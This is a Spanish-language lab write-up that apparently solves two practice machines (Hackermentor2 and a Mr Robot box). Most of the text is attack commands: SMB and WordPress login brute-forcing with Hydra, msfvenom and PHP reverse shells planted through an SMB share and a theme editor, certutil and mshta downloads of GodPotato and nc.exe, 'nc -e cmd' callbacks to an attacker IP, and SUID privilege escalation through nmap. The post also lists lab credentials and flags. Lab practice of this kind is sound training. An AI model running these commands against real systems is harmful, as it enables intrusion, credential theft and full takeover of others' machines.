---
title: "Resolución de Laboratorios Parte 2"
date: 2026-05-09 11:38:00 -0500
categories: [Pentesting, Windows Security, Post-Exploitation]
tags: [Metasploit, BadBlue, Pivoting, RDP, Privilege Escalation, Hydra, SSH, Meterpreter, msfvenom]
description: "Guía completa de laboratorios: explotación de BadBlue, técnicas de pivoting, persistencia con RDP y escalación de privilegios en Windows."
toc: true
---

Ahora se procede a resolver un laboratorio que se va a adjuntar para intentar explotarlo y poner a prueba los conocimientos.

## Hackermentor2
Primero como siempre se empieza buscando el host que puede ser con
```shell
arp-scan --interface=eth0 -localnet
```
Con ese comando encontramos la ip que deseamos atacar.
```shell
nmap ip -sS -n -Pn --min-rate 5000 -p-
```
Para saber la versión del sistema se hace un crackmapexec
```shell
crackmapexec smb ip #Si la versión 1 de smb está apagado no es ethernal blue.
```
```shell
nmap ip -sS -n -Pn --min-rate 5000 -p80,135,139,445,5985,47001 -sV
```
Luego de contrar la información abrimos la ip desde un navegador y nos arroja 5 usuarios que el autor agradece, esto es importente ir almacenando en un archivo
```shell
nano users.txt
    ruy
    marcos
    lander
    bogo
    vaiper
```
También algo que no debe faltar es el escaneo de directorios
```shell
dirb http://ip/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r
```
Mientras los resultados aparecen, ejecutamos smbclient de forma anónima
```shell
smbclient -L //ip -N
enum4linux -a ip
davtest -url http://ip
```
Ahora fuerza bruta de directorios
```shell
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://ip
crackmapexec smb ip -u users.txt -p users.txt 
```
Para buscar palabras específicas en qué línea del diccionario se encuentra se puede utilizar el siguiente comando
```shell
cat /usr/share/wordlists/rockyou.txt | grep -n "^bogo$"
```
Como ya sabemos usuario y clave accedemos por smb

```shell
smbclient -L //ip -U bogo
smbclient -L //ip/WEB -U bogo
smbclient -L //ip/LOGS -U bogo
    get 20231008.log
```
En el archivo log descargado encontramos un nuevo usuario
```shell
smbclient -L //ip/WEB -U marcos
    put users.txt
```
Como si permitió cargar el archivo, ahora debemos intentar cargar una reverse shell asp para windows
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4455 -f aspx -o reverse.aspx
smbclient -L //ip/WEB -U marcos
    put reverse.aspx
```
Como ya está en el servidor nuestra reverse shell, ahora debemos abrir un multi handler para msfconsole
```shell
msfconsole -q
use exploit/multi/handler
    set LHOST 192.168.1.10
    set LPORT 4455
    set payload windows/x64/meterpreter/reverse_tcp   
    run
```
Ahora desde la web abrimos reverse.aps y ya tenemos la sesión abierta.

### Opción 2
Ahora vamos a intentar acceder mediante una reverse del propio kali
```shell
cd /usr/share/webshells/aspx
smbclient  //ip/WEB -U marco%SuperPassword
    put cmdaspx.aspx
```
Ahora se nos abre en la web un cajón donde podemos interactuar con comados de linux.

### Opción 3 es con ayuda de hta server
```shell
msfconsole -q
set LHOST 192.168.1.10
set LPORT 1234
set TARGET 1
set payload windows/meterpreter/reverse_tcp
run
```
Una vez generada la hta reverse hay que colocar el link que genera con la reverse hta dentro del campo de la web que permite ejecutar código.
```shell
mshta.exe http://ip:8080/G69P4qE.hta #Comando para descargar archivos que están en el server
```

### Opción 4 con WinRM
```shell
msfconsole -q
use exploit/windows/smb/pexec
set smbpass SuperPassword
set smbuser marcos
set lport 7654
set RHOSTS ip
run
```
En ese resultado da error, pero para comprobar que con esas credenciales podemos conectarnos a smb, podemos ejecutar el siguiente comando
```shell
crackmapexec smb ip -u marcos -p SuperPassword
```
Si aparece !Pownd es que podemos conectarnos, caso contrario no.

Ahora vamos a conectardnos directo con cramapexec de otra manera
```shell
crackmapexec -t 1000 winrm dominio.local -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

crackmapexec -t 1000 winrm 192.168.1.10 -u users.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Opción 5
```shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.10 LPORT=6633 -f aspx -o reverse2.aspx
smbclient //192.168.1.10/WEB -U marcos%SuperPassword
put reverse2.aspx
```

Antes de ejecutar, desde otra terminal debemos dejar el puerto escucha

```shell
nc -nlvp 6633
```
Como tampoco funcionó, probamos ahora con otra revershell, [https://jiveturkey.rocks/tactics/2021/09/21/asp-reverse-shell.html]

```shell
nano reverse3.aspx #Cambiamos ip y puerto y subimos
smbclient //192.168.1.10/WEB -U marcos%SuperPassword
put reverse3.aspx
```
Puerto escucha activo
```shell
rlwrap nc -nlvp 9876
```
Con esta última opción fue la única que si funcionó y **rlwrap** permite que la shell sea interactiva si captura algo.

```shell
whoami /priv
    SetImpersonatePrivilege
```
Se puede intentar con Juice Potate, printspoofer, rawpotate, GodPotato

Ahora vamos con God Potato, para ello necesita los binarios de GodPotato y nc.exe, que se deben subir al equipo [nc.exe](https://github.com/int0x33/nc.exe/), si es máquina de 32bits, funciona nc.exe, si es máquina de 64bits, funciona 32bits y 64bits.
Ahora debemos descargar [GodPotato](https://github.com/BeichenDream/GodPotato/releases), donde el más estable es el Net4.exe.
Ql tener estos dos binarios en mi computador se debe subir a la máquina por lo que ocupamos lo siguiente
```shell
pytho3 -m http.server 80
```
Y para descargarnos en la máquina
```shell
certutil.exe -f -split -urlcache http://10.10.42.2/godpotato.exe godpotato.exe
certutil.exe -f -split -urlcache http://10.10.42.2/nc.exe nc.exe
```
Para ejecutar debemos utilizar el siguiente comando
```shell
godpotato.exe -cmd "cmd /c whoami"
```
El comando anterior permite ejecutar un comando como NT AUTHORITY SYSTEM, el sigueinte paso es ejecutar un (Revshells)[www.revshells.com], en el cual debemos buscar REverse -> Windows -> nc -e y terminar con cmd.

```shell
rlwrap nc -lvpn 6543
# En la máquina comprometida con God Potato ejecutar
Godportato.exe -cmd "nc.exe  192.168.1.101 -e cmd"
```
Con eso nos abre sesión en el puerto escucha.
### Opción 6
Se va a intentar con PrintSpoofer.exe
```shell
rlwrap nc -lvpn 1337

PrintSpoofer64.exe -c "nc.exe 192.168.1.101 1337 -e cmd"
tasklist /v | findstr /i "PrintSpoofer"
```
Con tasklist podemos ver si podemos o no ejecutar PrintSpoofer.

Con esto finalizamos este laboratorio.

## Hackermentor 3 - Mr Robot
Primero descubrimos la ip de nuestra máquina
```shell
nmap -sn 192.168.100.1/24
nmap -p- 192.168.100.140
nikto -h http://192.168.100.140

dirb http://192.168.100.140
wp-scan --url http://192.168.100.140/wp-login.php
```
Con dirb encontramos que existe un archivo robots.txt, el cuál esconde 1 flag y también un diccionario llamado fsocity.dic. Para ver cuántas líneas posee este diccionario ejecutamos lo siguiente
```shell
wc -l fsocity.dic
grep admin fsocity.dic
```
Con eso descubrimos que el archivo tiene 858160 líneas lo cuál es un problema para ataque de fuerza bruta. Al ir revisando una palabra con grep vemos que existen varias palabras repetidas por lo que debemos eliminar las que se repiten para reducir el tamaño del diccionario.
```shell
uniq fsocity.dic #Compara entre líneas, la de abajo con la de arriba.
sort fsocity.dic #Organiza el diccionario en orden alfabético

sort fsicity.dic | uniq > diccionariofinal.txt #Primero organizo y luego saco las palabras únicas.
```
Con eso reducimos el diccionario a 11000 palabras, lo cuál es más manejable.
Ahora procedemos con un ataque de hydra, pero antes en firefox dentro del panel de login ejecutamos lo siguiente:
* Clic derecho Inspect
* Network
* Poner cualquier clave y contraseña
* Revisar el resultado POST
* Ir a la pestaña request para ver la petición.
* 
```shell
hydra -vV -L diccionariofinal.txt -p admin 192.168.100.140 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" 
```
Con eso revisamos que obtenemos 3 usuarios los cuales son:
* Elliot
* elliot
* ELLIOT

Al haber encontrado el usuario, ahora procedemos a ejecutar lo mismo pero ahora cambiando el diccionario de la siguiente manera
```shell
hydra -vV -l elliot -P diccionariofinal.txt 192.168.100.140 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered" -t 4 -w 10
```
* El **t** significa número de hilos activos
* El **w** significa tiempo de espera en segundos
Al finalizar el resultado arroja que la clave es **ER28-0652**, por lo que se procede a probar en wordpress. Una forma de escalar privileios es mediante **Twenty Fifteen**.
```shell
localte php-ver
cp /usr/share/webshells/php/php-reverse-shell.php .
```
Ahora lo que hacemos es modificar la ip a la de nuestra máquina y escogemos un puerto cualquiera.
Con ayuda del editor de temas del Twenty Fiften nos dirigimos a 404 php y lo que hacemos es eliminar todo el código y poner el código de la reverse shell, con eso debemos abrir un puerto escucha y abrir una url con una página que no exista para habilitar el puerto escucha.

```shell
nc -lvnp 1234
```
Hecho eso ya tenemos acceso al servidor con el usuario **daemon**, al acceder intentamos leer la flag 2 pero no tenemos permiso de lectura, sin embargo al revisar la carpeta existe otro archivo donde si tenemos acceso a leer y dise lo siguiente:
* robot:c3fcd3d76192e4007dfb496cca67e13b
Al desifrar con (crackstation)[https://crackstation.net/], obtenemos la clave del usuario robot
* abcdefghijklmnopqrstuvwxyz

Ahora lo que debemos hacernos es conectarnos con ssh a la máquina utilizando el nuevo usuario y contraseña encontrado
```shell
ssh robot@192.168.100.140
    abcdefghijklmnopqrstuvwxyz
```

Con eso accedemos al servidor con el usuario robot y ya podemos leer la segunda flag que es 
* 822c73956184f694993bede3eb39f959

Para encontrar la segunda flag debemos localizar el archivo de configuración de wordpress para ver si algo está oculto ahí.

```shell
find / -name config.php 2>/dev/null
cd /opt/bitnami/apps/wordpress/htdocs
```
Al querer acceder a esa carpeta nos da un error de que no tenemos permiso, ahora debemos buscar un permiso SUID que podamos explotar
```shell
find / -perm -4000 2>/dev/null
```
Ahora con la ayuda de (GTOFBINS)[https://gtfobins.org/] buscamos en nmap el ataque por SUID
```shell
echo '...' >/path/to/temp-file
nmap --script=/path/to/temp-file
```
Con eso accedemos como root pero la terminal está como nmap>, para salir a la terminal normal se utiliza
```shell
sh!
```
Una vez que se tiene la shell normal, se procede a la ruta del directorio raiz del usuario root.
```shell
cd /root
ls
```
Y encontramos la última flag de esta máquina.

Para el último la hay q configurar las máquinas con distintas interfaces.
Drupal poner en cualquier otra interfaz y las otras en NAT